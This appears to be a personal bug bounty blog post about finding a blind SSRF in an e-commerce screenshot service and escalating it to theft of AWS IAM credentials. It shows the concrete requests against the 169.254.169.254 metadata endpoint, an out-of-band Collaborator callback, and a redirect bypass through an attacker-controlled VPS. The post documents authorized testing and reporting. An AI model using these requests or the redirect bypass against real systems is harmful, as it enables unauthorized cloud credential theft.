---
title: "My First P1: Finding a Blind SSRF in a Bug Bounty Program"
description: "How I found a blind Server-Side Request Forgery vulnerability in a Fortune 500 bug bounty program, escalated it to critical severity, and learned what actually matters in a P1 report."
date: "2025-06-10"
categories: ["Bug Bounty"]
tags: ["Bug Bounty", "SSRF", "HackerOne", "Web Security", "P1"]
coverGradient: "bugbounty"
---

Six months into bug bounty hunting, I was finding P4s and the occasional P3. Useful for building the discipline of consistent testing, but not enough to build a meaningful reputation or income. This is the story of my first P1: a blind SSRF that reached AWS metadata services and leaked temporary IAM credentials.

## The Target

Large e-commerce company, public program on HackerOne. Scope covered `*.company.com` with the standard exclusions around payment processing and authentication services. The program had a healthy payout range for critical findings. I will not name them because the disclosure window has not yet passed, even though the fix is deployed.

## Initial Recon

Standard methodology: `crt.sh` for subdomains, Shodan for exposed services. Found roughly 40 in-scope subdomains. Most were marketing sites or CDN endpoints. Three had interesting behavior:

- `api.company.com`: REST API returning JSON responses
- `import.company.com`: "Import products from URL" feature for merchant accounts
- `render.company.com`: Screenshot and preview service for product listings

The screenshot service stood out immediately. Any service that fetches a URL server-side is a high-priority SSRF candidate.

## Finding the Vulnerability

`render.company.com` accepted a `url=` parameter and returned a rendered screenshot. Classic setup.

First test: internal IP access.

```
GET /screenshot?url=http://169.254.169.254/latest/meta-data/
```

Response time was normal. Screenshot showed an error. No WAF blocking the request, which was encouraging. The absence of a hard block meant filtering (if any) was happening at the application layer.

Second test: out-of-band DNS confirmation.

```
GET /screenshot?url=http://your-burp-collaborator-id.burpcollaborator.net/
```

Collaborator received a DNS lookup. The server was resolving external hostnames. Blind SSRF confirmed.

## Escalation to P1

A blind SSRF that resolves DNS but returns no content is a P3 at best. Escalating to P1 required demonstrating real impact. The three realistic escalation paths were:

1. **AWS metadata service.** If the server runs on EC2, `169.254.169.254` serves IAM role credentials
2. **Internal service scanning.** Probing private IP ranges for admin panels or databases
3. **Cloud provider metadata variants.** GCP (`metadata.google.internal`) and Azure have equivalent endpoints

The DNS callback originated from an IP in an AWS address range. That narrowed the path considerably.

Tried the metadata credential endpoint directly:

```
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Collaborator received a hit. The server was making the HTTP request, not just a DNS lookup. This confirmed the SSRF was making full HTTP connections, not just resolving hostnames.

The common problem with metadata SSRF is getting the response back when the service returns errors to the browser. The solution is a redirect chain. I set up a simple redirect server on my VPS: any inbound request gets 301-redirected to the metadata endpoint.

Most SSRF filters check the initial URL for private IP ranges but do not follow redirects before allowing the request. This is the redirect bypass.

Request chain:
```
render.company.com -> my-vps.com/redirect -> 169.254.169.254/iam/credentials/ec2-role-name
```

The Collaborator response included the full HTTP request the server sent outbound, confirming it followed the redirect. Then the final request for credentials:

```
url=http://my-vps.com/redirect-to-creds
```

In the server response captured at my VPS, the credential payload was visible:

```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2025-06-10T..."
}
```

P1. The IAM credentials granted access to whatever policies were attached to that EC2 role.

## Writing the Report

This is where most hunters leave bounty on the table. A P1 finding with a vague or disorganized report gets slow triage and sometimes gets downgraded.

My report structure:

1. **One-line summary.** "Blind SSRF allows retrieval of AWS EC2 instance metadata including temporary IAM credentials via redirect bypass."
2. **CVSS score with justification.** CVSS 9.8, with a written explanation of each vector (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H).
3. **Step-by-step reproduction.** Exact requests, exact responses, timestamps. Assume the triager needs to reproduce it from scratch.
4. **Impact statement.** What an attacker can do with these credentials depends on the IAM role's attached policies. I listed the realistic worst cases: lateral movement to other AWS services, data exfiltration from S3, persistence via IAM user creation.
5. **Recommended fix.** URL allowlist for the screenshot service (only permit known CDN domains). Block SSRF to link-local address space at the network layer, not just the application layer.

Response time: 2 hours to acknowledgment. Triaged to P1 in 4 hours. Bounty paid within 8 days of submission.

## Key Lessons

**Screenshot services are high-value targets.** Any feature that fetches a URL server-side warrants thorough SSRF testing. Render services, link preview generators, PDF converters, and webhook testers are all in this category.

**Blind does not mean low severity.** Out-of-band channels (Burp Collaborator, [interactsh](https://github.com/projectdiscovery/interactsh)) make blind SSRF exploitable in ways that are fully demonstrable in a report. Never close a blind SSRF finding without attempting OOB escalation.

**The redirect bypass works.** Most SSRF mitigations check the initial URL at request time. A 301 redirect to a private IP issued by an attacker-controlled server bypasses this check in a large number of real implementations.

**Report quality affects payout speed.** A clear, professional report that anticipates every question a triager might ask gets faster validation and faster payment. The P1 from this finding paid more than my first 30 P4 findings combined. Quality over quantity is a real principle, not a cliche.
